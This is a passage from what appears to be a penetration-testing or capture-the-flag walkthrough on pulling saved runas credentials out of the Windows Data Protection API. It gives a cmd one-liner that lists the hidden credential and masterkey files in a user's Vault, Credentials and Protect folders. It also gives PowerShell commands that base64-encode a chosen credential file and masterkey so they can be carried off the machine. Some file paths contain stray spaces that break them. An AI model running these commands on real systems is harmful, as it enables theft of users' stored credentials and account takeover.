runas credential (and many other types of stored credentials) can be extracted from the Windows Data Protection API. In order to achieve this, it is necessary to identify the credential files and masterkeys. Credential filenames are a string of 32 characters, e.g. "85E671988F9A2D1981A4B6791F9A4EE8" while masterkeys are a GUID, e.g. "cc6eb538-28f1-4ab4-adf2-f5594e88f0b2". They have the "System files" attribute, and so "DIR /AS" must be used. The following "one-liner" will identify the available credential files and masterkeys.

```bash
cmd /c "dir /S /AS C:\Users\security\AppData\Local\Microsoft\Vault & dir /S /AS C:\Users\security\AppData\Local\Microsoft\Credentials & dir /S /AS C:\Users\security\AppData\Local\Microsoft\Protect & dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Vault & dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Credentials & dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Protect"
```

Powershell Base64 file transfer
The credential and masterkey are base64 encoded.

```bash
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\security\AppData\Roamin g\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290"))
```

```bash
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\security\AppData\Roamin g\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3 8 b43-d93d64590580"))
```


